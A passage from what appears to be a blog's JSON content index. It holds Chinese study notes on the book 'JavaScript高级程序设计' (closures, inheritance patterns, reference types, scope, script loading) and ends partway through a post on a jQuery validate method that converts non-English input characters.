页面\nhistory.go(\"nczonline.net\");\n\n//后退一页\nhistory.back();\n//前进一页\nhistory.forward();\n```","tags":["笔记"],"categories":["前端"]},{"title":"函数表达式（《JavaScript高级程序设计》）","url":"%2F2019-01-10-JS%E9%AB%98%E8%AE%BE3%E7%89%88-7%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n函数表达式：递归，闭包，模仿块级作用域，私有变量。\n\n<!-- more -->\n\n# 详述\n\n## 函数表达式与函数声明的区别\n\n- “函数声明提升”\n- 创建函数两种方式\n\n## 递归\n\n```js\nfunction factorial(num) {\n  if (num <= 1) {\n    return 1;\n  } else {\n    return num * arguments.callee(num - 1);\n  }\n}\n// 严格模式下实现（访问arguments.callee有错误）\nvar factorial = function f(num) {\n  if (num <= 1) {\n    return 1;\n  } else {\n    return num * f(num - 1);\n  }\n};\n```\n\n## 闭包\n\n### 1. 匿名函数与闭包\n\n- 闭包是指有权访问另一个函数作用域中的变量的函数。\n- 创建闭包的常见方式就是在一个函数内部创建另一个函数。\n\n### 2. 闭包与变量\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var i = 0; i < 10; i++) {\n    result[i] = function() {\n      return i;\n    };\n  }\n  return result;\n}\n```\n\n### 3. 关于 this 对象\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    return function() {\n      return this.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"The Window\"（在非严格模式下）\n```\n\n## 模仿块级作用域\n\n```js\n(function() {\n  //这里是块级作用域\n})();\n```\n\n## 私有变量\n\n### 1. 两种在对象上创建特权方法的方式\n\n构造函数实现方式\n\n```js\n// 构造函数实现方式\nfunction MyObject() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //特权方法\n  this.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n}\n\n// 示例\nfunction Person(name) {\n  this.getName = function() {\n    return name;\n  };\n  this.setName = function(value) {\n    name = value;\n  };\n}\nvar person = new Person(\"Nicholas\");\nalert(person.getName()); //\"Nicholas\"\nperson.setName(\"Greg\");\nalert(person.getName()); //\"Greg\"\n```\n\n静态私有变量实现方式\n\n```js\n// 静态私有变量实现方式\n(function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //构造函数\n  MyObject = function() {};\n  //公有/特权方法\n  MyObject.prototype.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n})();\n\n// 示例\n(function() {\n  var name = \"\";\n  Person = function(value) {\n    name = value;\n  };\n  Person.prototype.getName = function() {\n    return name;\n  };\n  Person.prototype.setName = function(value) {\n    name = value;\n  };\n})();\nvar person1 = new Person(\"Nicholas\");\nalert(person1.getName()); //\"Nicholas\"\nperson1.setName(\"Greg\");\nalert(person1.getName()); //\"Greg\"\nvar person2 = new Person(\"Michael\");\nalert(person1.getName()); //\"Michael\"\nalert(person2.getName()); //\"Michael\"\n```\n\n## 单例模式（模块模式）\n普通方式\n```js\nvar singleton = (function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //特权/公有方法和属性\n  return {\n    publicProperty: true,\n    publicMethod: function() {\n      privateVariable++;\n      return privateFunction();\n    }\n  };\n})();\n```\n增强方式（适合那些单例必须是某种类型的实例）\n```js\nvar singleton = (function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //创建对象\n  var object = new CustomType();\n  //添加特权/公有属性和方法\n  object.publicProperty = true;\n  object.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n  //返回这个对象\n  return object;\n})();\n```\n","tags":["笔记"],"categories":["前端"]},{"title":"面向对象的程序设计（《JavaScript高级程序设计》）","url":"%2F2019-01-10-JS%E9%AB%98%E8%AE%BE3%E7%89%88-6%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n面向对象的程序设计：理解对象，创建对象，继承。\n\n<!-- more -->\n\n# 详述\n\n## 对象\n\n无序属性的集合，其属性可以包含基本值、对象或者函数。\n\n### 属性\n\n1. 数据属性\n\n- [[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Enumerable]]：表示能否通过 for-in 循环返回属性。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Writable]]：表示能否修改属性的值。像前面例子中那样直接在对象上定义的属性，它们的这个特性默认值为 true。\n- [[Value]]：包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值的时候，把新值保存在这个位置。这个特性的默认值为 undefined。\n\n2. 访问器属性\n\n- [[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。对于直接在对象上定义的属性，这个特性的默认值为 true。\n- [[Enumerable]]：表示能否通过 for-in 循环返回属性。对于直接在对象上定义的属性，这个特性的默认值为 true。\n- [[Get]]：在读取属性时调用的函数。默认值为 undefined。\n- [[Set]]：在写入属性时调用的函数。默认值为 undefined。\n  访问器属性不能直接定义，必须使用 Object.defineProperty()来定义。\n\n### 读取属性特性\n\n方法：`var descriptorObj = Object.getOwnPropertyDescriptor(obj, property);`\n\n\n## 创建对象\n\n### 构造函数模式\n\n```js\nfunction Person(name, age, job) {\n  this.name = name;\n  this.age = age;\n  this.job = job;\n  this.sayName = function() {\n    alert(this.name);\n  };\n}\nvar person1 = new Person(\"Nicholas\", 29, \"Software Engineer\");\nvar person2 = new Person(\"Greg\", 27, \"Doctor\");\nalert(person1.sayName == person2.sayName); //false\n```\n\n### 原型模式\n\n```js\nfunction Person() {}\nPerson.prototype.name = \"Nicholas\";\nPerson.prototype.age = 29;\nPerson.prototype.job = \"Software Engineer\";\nPerson.prototype.sayName = function() {\n  alert(this.name);\n};\nvar person1 = new Person();\nperson1.sayName(); //\"Nicholas\"\nvar person2 = new Person();\nperson2.sayName(); //\"Nicholas\"\nalert(person1.sayName == person2.sayName); //true\n```\n\n同时使用 hasOwnProperty()方法和 in 操作符，就可以确定该属性到底是存在于对象中，还是存在于\n原型中\n\n```js\nfunction hasPrototypeProperty(object, name) {\n  return !object.hasOwnProperty(name) && name in object;\n}\n```\n\n### 组合使用构造函数模式和原型模式(**推荐模式**)\n\n```js\nfunction Person(name, age, job) {\n  this.name = name;\n  this.age = age;\n  this.job = job;\n  this.friends = [\"Shelby\", \"Court\"];\n}\nPerson.prototype = {\n  constructor: Person,\n  sayName: function() {\n    alert(this.name);\n  }\n};\nvar person1 = new Person(\"Nicholas\", 29, \"Software Engineer\");\nvar person2 = new Person(\"Greg\", 27, \"Doctor\");\nperson1.friends.push(\"Van\");\nalert(person1.friends); //\"Shelby,Count,Van\"\nalert(person2.friends); //\"Shelby,Count\"\nalert(person1.friends === person2.friends); //false\nalert(person1.sayName === person2.sayName); //true\n```\n\n## 继承\n\n### 原型链\n\n```js\nfunction SuperType() {\n  this.property = true;\n}\nSuperType.prototype.getSuperValue = function() {\n  return this.property;\n};\nfunction SubType() {\n  this.subproperty = false;\n}\n//继承了SuperType\nSubType.prototype = new SuperType();\nSubType.prototype.getSubValue = function() {\n  return this.subproperty;\n};\nvar instance = new SubType();\nalert(instance.getSuperValue()); //true\n```\n\n![原型链关系图](1.jpg)\n\n### 组合继承（**最常用**）\n\n```js\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  //继承属性\n  SuperType.call(this, name);\n  this.age = age;\n}\n//继承方法\nSubType.prototype = new SuperType();\nSubType.prototype.constructor = SubType;\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\nvar instance1 = new SubType(\"Nicholas\", 29);\ninstance1.colors.push(\"black\");\nalert(instance1.colors); //\"red,blue,green,black\"\ninstance1.sayName(); //\"Nicholas\";\ninstance1.sayAge(); //29\nvar instance2 = new SubType(\"Greg\", 27);\nalert(instance2.colors); //\"red,blue,green\"\ninstance2.sayName(); //\"Greg\";\ninstance2.sayAge(); //27\n```\n\n### 原型式继承\n\n```js\nfunction object(o) {\n  function F() {}\n  F.prototype = o;\n  return new F();\n}\nvar person = {\nname: \"Nicholas\",\nfriends: [\"Shelby\", \"Court\", \"Van\"]\n};\nvar anotherPerson = object(person);\nanotherPerson.name = \"Greg\";\nanotherPerson.friends.push(\"Rob\");\nvar yetAnotherPerson = object(person);\nyetAnotherPerson.name = \"Linda\";\nyetAnotherPerson.friends.push(\"Barbie\");\nalert(person.friends); //\"Shelby,Court,Van,Rob,Barbie\"\n\n// ES5 Object.create()实现\nvar person = {\nname: \"Nicholas\",\nfriends: [\"Shelby\", \"Court\", \"Van\"]\n};\nvar anotherPerson = Object.create(person);\nanotherPerson.name = \"Greg\";\nanotherPerson.friends.push(\"Rob\");\nvar yetAnotherPerson = Object.create(person);\nyetAnotherPerson.name = \"Linda\";\nyetAnotherPerson.friends.push(\"Barbie\");\nalert(person.friends); //\"Shelby,Court,Van,Rob,Barbie\"\n```\n\n### 寄生组合式继承（**最理想**）\n\n```js\nfunction object(o) {\n  function F() {}\n  F.prototype = o;\n  return new F();\n}\nfunction inheritPrototype(subType, superType) {\n  var prototype = object(superType.prototype); //创建对象\n  prototype.constructor = subType; //增强对象\n  subType.prototype = prototype; //指定对象\n}\nfunction SuperType(name) {\n  this.name = name;\n  this.colors = [\"red\", \"blue\", \"green\"];\n}\nSuperType.prototype.sayName = function() {\n  alert(this.name);\n};\nfunction SubType(name, age) {\n  SuperType.call(this, name);\n  this.age = age;\n}\ninheritPrototype(SubType, SuperType);\nSubType.prototype.sayAge = function() {\n  alert(this.age);\n};\n```\n","tags":["笔记"],"categories":["前端"]},{"title":"引用类型（《JavaScript高级程序设计》）","url":"%2F2019-01-10-JS%E9%AB%98%E8%AE%BE3%E7%89%88-5%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n引用类型：重点掌握数组，正则，字符串的相关使用。\n<!-- more -->\n\n# 详述\n\n## Array 类型\n\n1.  读取值用方括号`+`基于 0 的数字索引，例如`color[0]`。\n2.  length 属性的使用，例如`colors[colors.length] = \"black\";`。\n3.  检测数组，`Array.isArray(value)`。\n4.  `toString()`方法返回逗号分隔的字符串，想用其他分隔符可以用`join()`方法。\n5.  常用方法：\n\n    - 栈 LIFO（Last-In-First-Out，后进先出）方法`push() + pop()`\n    - 队列 FIFO（First-In-First-Out，先进先出）方法`push() + shift()`，反方向`unshift() + pop()`\n    - 排序方法`reverse()、sort()`\n    - `concat()`方法，不改原数组，返回新数组，参数可以为空、一个、多个，可以为数组或者值。\n    - `slice()`方法，不改原数组，返回新数组，参数可以一个或者两个，即起始位置和结束位置。若只有一个参数，则返回给定起始位置到数组末尾所有项。若两个参数，则返回起始到结束位置间的所有项，不包括结束位置项。\n      语法：\n\n      ```js\n      arr.slice();\n      // [0, end]\n\n      arr.slice(begin);\n      // [begin, end]\n\n      arr.slice(begin, end);\n      // [begin, end)\n      ```\n\n    - `splice()`，实现**删除**、**插入**和**替换**，修改原数组，返回新数组。\n      语法：\n      `js array.splice(start[, deleteCount[, item1[, item2[, ...]]]])`\n    - `indexOf()和lastIndexOf()`，返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。\n      语法：\n      `js arr.indexOf(searchElement) arr.indexOf(searchElement[, fromIndex]) arr.lastIndexOf(searchElement) arr.lastIndexOf(searchElement[, fromIndex])`\n    - `every()`：对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。\n    - `filter()`：对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组。\n    - `forEach()`：对数组中的每一项运行给定函数。这个方法没有返回值。\n    - `map()`：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。\n    - `some()`：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。\n    - `reduce()和reduceRight()`，这两个方法都会迭代数组的所有项，然后构建一个最终返回的值。其中，reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。\n\n      ```js\n      var values = [1, 2, 3, 4, 5];\n      var sum = values.reduce(function(prev, cur, index, array) {\n        return prev + cur;\n      });\n      alert(sum); //15\n\n      var values = [1, 2, 3, 4, 5];\n      var sum = values.reduceRight(function(prev, cur, index, array) {\n        return prev + cur;\n      });\n      alert(sum); //15\n      ```\n\n## Date 类型\n\n1. `Date.now()`\n2. `Date.parse()`\n3. `date.getTime()`\n\n## RegExp 类型\n\n1. 语法`var expression = / pattern /flags;`。\n2. flags 标志有 3 个：\n   - g：表示全局（global）模式，即模式将被应用于所有字符串，而非在发现第一个匹配项时立即停止；\n   - i：表示不区分大小写（case-insensitive）模式，即在确定匹配项时忽略模式与字符串的大小写；\n   - m：表示多行（multiline）模式，即在到达一行文本末尾时还会继续查找下一行中是否存在与模式匹配的项。\n3. 模式中元字符需要转义，元字符包括：`( [ { \\ ^ $ | ) ? * + .]}`。\n4. 实例属性：\n   - global：布尔值，表示是否设置了 g 标志。\n   - ignoreCase：布尔值，表示是否设置了 i 标志。\n   - lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从 0 算起。\n   - multiline：布尔值，表示是否设置了 m 标志。\n   - source：正则表达式的字符串表示，按照字面量形式而非传入构造函数中的字符串模式返回。\n5. 实例方法：\n   - `exec()`：待完善\n   - `test()`：待完善\n6. 构造函数属性：待完善\n7. 模式的局限性：待完善\n\n## Function 类型\n\n1. 没有重载（深入理解）：函数名是引用（指针），后声明的会覆盖之前的。\n2. 函数声明与函数表达式：解析器处理方式不同，函数声明会在执行其他代码前先读取，函数表达式会在执行到该代码时才读取执行。\n3. 作为值的函数\n\n```js\nfunction createComparisonFunction(propertyName) {\n  return function(object1, object2) {\n    var value1 = object1[propertyName];\n    var value2 = object2[propertyName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\n```\n\n4. 函数内部属性：内部两个特殊的对象：`arguments` 和`this`。\n   - 理解`arguments.callee`\n   - 理解`arguments.callee.caller`\n5. 函数属性和方法：\n   - `length`和`prototype`\n   - 每个函数都包含两个非继承而来的方法：`apply()`和`call()`。\n   - `bind()`\n\n## 基本包装类型\n\n1. Boolean 类型\n2. Number 类型\n   - `num.toFixed([digits])`，参数表示保留几位小数，四舍五入。\n   - `num.toExponential([digits])`，参数表示保留几位小数，四舍五入，e 表示法。\n   - `num.toPrecision([digits])`，参数表示保留所有数字的位数（不包括指数部分），灵活返回 fixed 或者 exponential 格式。\n3. String 类型\n   - `charAt()`和`charCodeAt()`，访问特定字符。\n   - `concat()`，拼接字符串，但是实践中更多用'+'。\n   - `slice(start[, end])`，不改原字符串，返回新字符串。\n   - `substr(start[, length])`，不改原字符串，返回新字符串。\n   - `substring(start[, end])`，不改原字符串，返回新字符串。\n   - `indexOf()`和`lastIndexOf()`，查找子字符串位置。\n   - `trim()`，删除首尾空格，不改原字符串，返回新字符串。\n   - `toLowerCase()`、`toLocaleLowerCase()`、`toUpperCase()`和`toLocaleUpperCase()`，大小写转换，不改原字符串，返回新字符串。\n   - `match()`\n   - `search()`\n   - `replace()`\n   - `split()`\n   - `localeCompare()`，比较该字符串与参数字符串在字母表中的位置，前负，后正，等零。\n   - `fromCharCode()`，静态方法，与实例方法`charCodeAt()`相反操作。\n     ```js\n     alert(String.fromCharCode(104, 101, 108, 108, 111)); //\"hello\"\n     ```\n\n## 单体内置对象\n\n1. Global 对象\n   - `encodeURI()`和`encodeURIComponent()`\n     ```js\n     var uri = \"http://www.wrox.com/illegal value.htm#start\";\n     //\"http://www.wrox.com/illegal%20value.htm#start\"\n     alert(encodeURI(uri));\n     //\"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\"\n     alert(encodeURIComponent(uri));\n     ```\n   - `decodeURI()`和`decodeURIComponent()`\n     ```js\n     var uri = \"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\";\n     //http%3A%2F%2Fwww.wrox.com%2Fillegal value.htm%23start\n     alert(decodeURI(uri));\n     //http://www.wrox.com/illegal value.htm#start\n     alert(decodeURIComponent(uri));\n     ```\n   - `eval()`，谨慎使用，防止代码注入。\n2. Math 对象\n   - `Math.PI`，π 的值。\n   - `Math.min()`，最小值。\n   - `Math.max()`，最大值。\n   - `Math.ceil()`，向上舍入。\n   - `Math.floor()`，向下舍入。\n   - `Math.round()`，四舍五入。\n   - `Math.random()`，随机数`[0,1)`。\n   - `Math.abs()`，绝对值。\n","tags":["笔记"],"categories":["前端"]},{"title":"变量、作用域和内存问题（《JavaScript高级程序设计》）","url":"%2F2018-2018-12-20-JS%E9%AB%98%E8%AE%BE3%E7%89%88-4%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n理解基本类型和引用类型的值，理解执行环境，理解垃圾收集\n<!-- more -->\n\n# 详述\n\n## 基本类型值和引用类型值的特点：\n1. 基本类型值在内存中占据固定大小的空间，因此被保存在栈内存中；\n2. 从一个变量向另一个变量复制基本类型的值，会创建这个值的一个副本；\n3. 引用类型的值是对象，保存在堆内存中；\n4. 包含引用类型值的变量实际上包含的并不是对象本身，而是一个指向该对象的指针；\n5. 从一个变量向另一个变量复制引用类型的值，复制的其实是指针，因此两个变量最终都指向同一个对象；\n6. 确定一个值是哪种基本类型可以使用typeof 操作符，而确定一个值是哪种引用类型可以使用instanceof 操作符。\n\n## 执行环境（作用域），总结如下：\n1. 执行环境有全局执行环境（也称为全局环境）和函数执行环境之分；\n2. 每次进入一个新执行环境，都会创建一个用于搜索变量和函数的作用域链；\n3. 函数的局部环境不仅有权访问函数作用域中的变量，而且有权访问其包含（父）环境，乃至全局环境；\n4. 全局环境只能访问在全局环境中定义的变量和函数，而不能直接访问局部环境中的任何数据；\n5. 变量的执行环境有助于确定应该何时释放内存。\n\n## 垃圾收集（自动回收），总结如下：\n1. 离开作用域的值将被自动标记为可以回收，因此将在垃圾收集期间被删除。\n2. “标记清除”是目前主流的垃圾收集算法，这种算法的思想是给当前不使用的值加上标记，然后再回收其内存。\n3. 另一种垃圾收集算法是“引用计数”，这种算法的思想是跟踪记录所有值被引用的次数。JavaScript引擎目前都不再使用这种算法；但在IE 中访问非原生JavaScript 对象（如DOM 元素）时，这种算法仍然可能会导致问题。\n4. 当代码中存在循环引用现象时，“引用计数”算法就会导致问题。\n5. 解除变量的引用不仅有助于消除循环引用现象，而且对垃圾收集也有好处。为了确保有效地回收内存，应该及时解除不再使用的全局对象、全局对象属性以及循环引用变量的引用。","tags":["笔记"],"categories":["前端"]},{"title":"基本概念（《JavaScript高级程序设计》）","url":"%2F2018-2018-12-20-JS%E9%AB%98%E8%AE%BE3%E7%89%88-3%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n了解语法、数据类型、流控制语句和函数\n<!-- more -->\n\n# 详述\n\n## 基础语法\n1. 区分大小写；\n2. 标识符：字母、下划线、美元符号和数字，首字母不能为数字；\n3. 注释：\n```js\n// 单行注释\n/*\n多行注释\n块级注释\n*/\n```\n4. 严格模式：加上\"use strict\"，单独脚本放在顶部，单独函数使用放在函数体第一行；\n5. 语句：分号`,`结尾，多条语句放到代码块中`{...}`；\n6. 关键字和保留字不用专门记，定义变量`var + 标识符`。\n\n## 数据类型\n1. 5种简单数据类型：Undefined、Null、Bollean、Number和String；1种复杂数据类型Object；\n2. typeof操作符返回值：\n    - \"undefined\"——未定义\n    - \"boolean\"——布尔值\n    - \"string\"——字符串\n    - \"number\"——数值\n    - \"object\"——对象或null\n    - \"function\"——函数\n3. 浮点数值存在精度问题：`0.1 + 0.2 != 0.3`；\n4. NaN，即非数值是一个特殊数值。两个特点：任何涉及NaN的操作都返回NaN，NaN与任何值都不相等，包括NaN本身。全局函数`isNaN()`判断不能转换为数值的值。\n5. 数值与字符串之间转换可加入基数的方法：`parseInt(\"10\", 8)`和`10.toString(8)`。\n6. Ojbect类型常用实例属性和方法：constructor、hasOwnProperty(propertyName)、isPrototypeOf(object)。\n\n## 操作符\n1. 递增和递减的前置型与后置型的区别：前置型先自增（减）再运算，后置型反之。\n2. `+`加号运算符可以拼接字符串。\n3. 不同类型变量间运算会自动类型转换。\n\n## 语句\n1. 熟悉if语句、do-while语句、while语句、for语句、for-in语句、label语句、break语句、continue语句、with语句和switch语句。\n2. switch语句特点：可以在switch语句中庸任何数据类型；每个case值可以是常量、变量和表达式。\n\n## 函数\n1. function定义，有作用域，参数个数及类型不定，没有重载。\n2. 没有重载的理解：函数是对象，函数名只是变量名，因为不存在参数个数及参数类型限制，所以后定义的覆盖先定义的，也就无所谓重载了。\n3. 可以通过`arguments`类数组对象来访问参数。","tags":["笔记"],"categories":["前端"]},{"title":"在HTML中使用JavaScript（《JavaScript高级程序设计》）","url":"%2F2018-2018-12-19-JS%E9%AB%98%E8%AE%BE3%E7%89%88-2%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n第2章，使用`<script>`元素，嵌入脚本与外部脚本，文档模式对JS的影响，考虑禁用JS的场景。\n<!-- more -->\n\n# 详述\n\n## 具体知识点如下：\n\n+ 使用`<script>`元素，src属性引用外部脚本，async属性异步加载立即执行，defer属性异步加载延迟执行，对于defer目前不能保证延迟顺序执行（HTML5标准规定顺序执行）。\n\n+ 嵌入脚本，不能在代码任何地方出现`</script>`字符串，需要转义，如下：\n```html\n<script type=\"text/javascript\">\nfunction sayScript(){\nalert(\"<\\/script>\");\n}\n</script>\n```\n+ XHTML中嵌入脚本不能直接用大小写符号\"<\"和\">\"，兼容写法如下：\n```html\n<script type=\"text/javascript\">\n//<![CDATA[\nfunction compare(a, b) {\nif (a < b) {\nalert(\"A is less than B\");\n} else if (a > b) {\nalert(\"A is greater than B\");\n} else {\nalert(\"A is equal to B\");\n}\n}\n//]]>\n</script>\n```\n\n+ 使用`<noscript>`元素，其中内容只在以下两种情况下显示：浏览器不支持脚本；浏览器支持脚本，但脚本被禁用。\n\n## 最佳实践\n用`<script>`元素引入外部脚本，位置放在`</body>`元素前面。首先引入外部脚本容易维护，可换成，避免嵌入脚本转义大小写符号等额外处理；其次放在`</body>`前面不会阻塞dom渲染，也避免脚本执行时操作的某个dom元素不存在；最后也可以实现顺序执行脚本。\n# 后记\n记住“最佳实践”足以。","tags":["笔记"],"categories":["前端"]},{"title":"JavaScript简介（《JavaScript高级程序设计》）","url":"%2F2018-2018-12-18-JS%E9%AB%98%E8%AE%BE3%E7%89%88-1%2F","content":"# 前言\n《JavaScript高级程序设计》，之前读过第2版，这次重读第3版，发现还是收获颇多，一方面是随着HTML5及CSS3的发布，更新了很多新知识点；另一方面经过几年工作之后再回头看，原来万变不离其宗，技术栈在不断更新，但是底层接口还是一样，编程思想也是一样。最后，通过这次温故知新，使知识体系更加的完整。\n# 概述\n第1章，了解JavaScript简史，实现和版本。\n<!-- more -->\n\n# 详述\n\n## JavaScript简史\n一种专为与网页交互而设计的脚本语言，最早来自于网景公司，目的是为了减少服务器端请求，直接在页面端验证。名字最初叫LiveScript，后来为了搭上Java热炒的顺风车，改名叫JavaScript，只是为了推广，两种语言没有直接关系。\n## JavaScript实现\n![JavaScript包括：ECMAScript、DOM、BOM](1-1.jpg)\n完整的JavaScript实现由三部分组成：\nECMAScript，由ECMA-262定义，提供核心语言功能；\n文档对象模型（DOM），提供访问和操作网页内容的方法和接口；\n浏览器对象模型（BOM），提供与浏览器交互的方法和接口。\n\nECMAScript定义语言基础，不同宿主环境有不同的实现，常见的有web浏览器，Node，Adobe Flash，个人理解有点类似java语言中的接口与具体实现类的关系。\n\nDOM是针对XML但经过扩展用于HTML的应用程序编程接口，把文档映射成结构树，不同组成部分对应不同类型节点和数据，通过DOM的API，就可以对文档进行增删改查。DOM是W3C为了解决浏览器互不兼容的问题，而制定的行业标准。DOM分不同级别，各浏览器不同版本实现的程度也不同。\n![结构树](1-2.jpg)\n\nBOM是处理浏览器相关的接口，主要包括如下：\n+ 弹出新浏览器窗口的功能；\n+ 移动、缩放和关闭浏览器窗口的功能；\n+ 提供浏览器详细信息的navigator 对象；\n+ 提供浏览器所加载页面的详细信息的location 对象；\n+ 提供用户显示器分辨率详细信息的screen 对象；\n+ 对cookies 的支持；\n+ 像XMLHttpRequest 和IE 的ActiveXObject 这样的自定义对象。\n\n## JavaScript版本\n现在只有Mozilla公司还在沿用，已没有关注的意义。目前提及浏览器对JavaScript的支持情况，一般都以ECMAScript兼容性和对DOM的支持情况为准。\n\n# 后记\nJS中的DOM包括DOM核心和DOM HTML，其他处理XML的语言实现自己的接口，例如SVG（Scalable Vector Graphic，可伸缩矢量图）1.0。BOM一直没有统一标准，HTML5有望统一。","tags":["笔记"],"categories":["前端"]},{"title":"英文输入框字符纠正","url":"%2F2018-09-19-x2en%2F","content":"\n\n# 前言\n\n在仅可输入英文字符的输入框内填写中文或其他语言的字符时，会给出报错。如果用户在复制进大段文字中夹杂了少许中文标点符，那么很难排查。因此，需要在原有校验基础上进行交互改进：失焦后标点符号自动转换，还有不能转换的给出提示框，同意则自动删除非法字符，取消则关闭提示框，用户手动修改。\n\n# 概述\n\n这是结合[jquery 的 validate 表单验证插件](https://jqueryvalidation.org/)及已有的 UI 组件进行的表单输入框交互改进方案。因此，如果不是 validate 框架则要重写 js 方法，如果是自定义的提示框结构样式，则需要添加相应的钩子：`.J-x2en-contianer/.J-x2en-feedback/.J-m-tip/.J-show-btn/.J-confirm-btn/.J-cancel-btn`。\n\n## 效果展示\n\n![效果展示](x2en.gif)\n\n<!-- more -->\n\n# 详述\n\nhtml 代码如下：\n\n```\n<div class=\"form-item\">\n    <label class=\"form-label\">remark:</label>\n\n    <div class=\"form-fields\">\n        <div class=\"col-9\">\n            <textarea name=\"remark\" placeholder=\"\" class=\"input-text input-description\"></textarea>\n            <div class=\"feedback-block auto-en-feedback J-x2en-feedback\" wrapfor=\"remark\">\n                <div class=\"auto-en-extra\">\n                    <a href=\"javascript:void(0)\" class=\"J-show-btn\">Not found?</a>\n                    <div class=\"m-tip arrow-bottom J-m-tip\">\n                        <div class=\"tip-con\">\n                            The system will help you to delete non-English characters. Are you sure to continue?<br>\n                            <a href=\"javascript:void(0);\" class=\"btn btn-main J-confirm-btn\">Confirm</a>\n                            <a href=\"javascript:void(0);\" class=\"btn J-cancel-btn\">Cancel</a>\n                        </div>\n                        <div class=\"arrow arrow-out\">\n                            <span class=\"arrow arrow-in\"></span>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        </div>\n\n    </div>\n</div>\n```\n\nvalidate 扩展方法如下：\n\n```\n    /**\n     * 非英文标点符号自动转成英文标点符号，如果还有无法转化的，则给出报错提示。\n     */\n    $.validator.addMethod(\"x2en\", function (val, ele, params) {\n        // 非英文不包含特殊符号正则\n        var reg = /[^\\x00-\\x9f\\xa1-\\xff\\u0000-\\u009f\\u00a1-\\u00ff\\u0021-\\u002c\\u002e\\u002f\\u003a-\\u0040\\u0043\\u0046\\u005b-\\u0060\\u007b-\\u007d\\u00a1-\\u00ac\\u00ae-\\u0113\\u0116-\\u0122\\u0124-\\u012b\\u012e-\\u014d\\u0150-\\u017e\\u0192\\u01b5\\u01f5\\u0237\\u02c6\\u02c7\\u02d8-\\u02dd\\u0311\\u0391-\\u03a1\\u03a3-\\u03a9\\u03b1-\\u03c9\\u03d1\\u03d2\\u03d5\\u03d6\\u03dc\\u03dd\\u03f0\\u03f1\\u03f5\\u03f6\\u0401-\\u040c\\u040e-\\u044f\\u0451-\\u045c\\u045e\\u045f\\u2010\\u2013\\u2015\\u2016\\u2018-\\u201a\\u201c-\\u201e\\u2020-\\u2022\\u2025\\u2026\\u2030-\\u2035\\u2039\\u203a\\u203e\\u2041\\u2043\\u2044\\u20ac\\u20db\\u20dc\\u2102\\u2105\\u210a-\\u2113\\u2115-\\u211e\\u2122\\u2124\\u2127-\\u2129\\u212c\\u212d\\u212f-\\u2131\\u2133-\\u2138\\u2153-\\u215e\\u2190-\\u219b\\u219d-\\u21a7\\u21a9-\\u21ae\\u21b0-\\u21b3\\u21b5-\\u21b7\\u21ba-\\u21db\\u21dd\\u21e4\\u21e5\\u2200-\\u2205\\u2207-\\u2209\\u220b\\u220c\\u220f-\\u2214\\u2216-\\u2218\\u221a\\u221d-\\u2238\\u223a-\\u2257\\u2259\\u225a\\u225c\\u225f-\\u2262\\u2264-\\u228b\\u228d-\\u229b\\u229d-\\u22a5\\u22a7-\\u22b0\\u22b2-\\u22bb\\u22bd-\\u22db\\u22de-\\u22e3\\u22e6-\\u22f1\\u2305\\u2306\\u2308-\\u2310\\u2312\\u2313\\u2315\\u2316\\u231c-\\u231f\\u2322\\u2323\\u232d\\u232e\\u2336\\u233d\\u233f\\u2423\\u24c8\\u2500\\u2502\\u250c\\u2510\\u2514\\u2518\\u251c\\u2524\\u252c\\u2534\\u253c\\u2550-\\u256c\\u2580\\u2584\\u2588\\u2591-\\u2593\\u25aa\\u25ab\\u25ad\\u25ae\\u25b1\\u25b3-\\u25b5\\u25b8\\u25b9\\u25bd-\\u25bf\\u25c2\\u25c3\\u25ca\\u25cb\\u25ec\\u25ef\\u2605\\u2606\\u260e\\u2640\\u2642\\u2660\\u2663\\u2665\\u2666\\u266a\\u266d-\\u266f\\u2713\\u2717\\u2720\\u2736\\u2758\\u2772\\u2773\\u2935\\u2985\\u2986\\u29bf\\u2a00-\\u2a02\\u2a04\\u2a06\\u2a0c\\u2a0d\\u2a10-